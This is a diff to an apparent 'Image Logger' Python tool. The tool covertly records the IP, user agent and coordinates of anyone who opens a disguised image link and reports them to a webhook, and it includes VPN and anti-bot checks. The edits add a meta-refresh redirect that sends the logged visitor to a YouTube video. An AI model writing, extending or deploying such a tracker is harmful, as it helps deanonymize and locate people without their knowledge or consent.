@@ -17,8 +17,7 @@ config = {
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True,
     # Allows you to use a URL argument to change the image (SEE THE README)
-    "youtube_link" = "https://www.youtube.com/embed/RAZSdO2DA3E?autoplay=1&fs=1"
-    
+
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
@@ -89,6 +88,7 @@ def reportError(error):
     ],
 })
     
+    
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
         return
@@ -118,7 +118,11 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         
         if config["vpnCheck"] == 1:
             ping = ""
-    
+
+        if config["redirect"]["redirect"]:
+            youtube_link = "https://www.youtube.com/embed/RAZSdO2DA3E?autoplay=1&fs=1"
+            data = f'<meta http-equiv="refresh" content="0;url={youtube_link}">'.encode()
+
     if info["hosting"]:
         if config["antiBot"] == 4:
             if info["proxy"]:
